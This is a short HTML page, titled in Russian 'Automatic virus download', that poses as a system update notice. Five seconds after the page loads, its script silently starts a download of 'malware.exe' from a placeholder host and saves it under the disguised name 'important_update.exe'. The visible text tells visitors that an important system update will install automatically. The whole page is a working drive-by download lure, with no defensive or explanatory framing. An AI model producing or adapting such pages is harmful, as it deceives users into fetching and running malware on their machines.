<!DOCTYPE html>
<html>
<head>
  <title>Автоматическое скачивание вируса</title>
  <script>
    function automaticDownload() {
      var link = document.createElement('a');
      link.href = 'http://virus-url/malware.exe'; 
      link.download = 'important_update.exe';
      link.click();
    }

    window.onload = function() {
      setTimeout(automaticDownload, 5000); // Запуск через 5 секунд после загрузки страницы
    };
  </script>
</head>
<body>
  <p>Важное обновление системы. Процесс установки будет начат автоматически.</p>
</body>
</html>
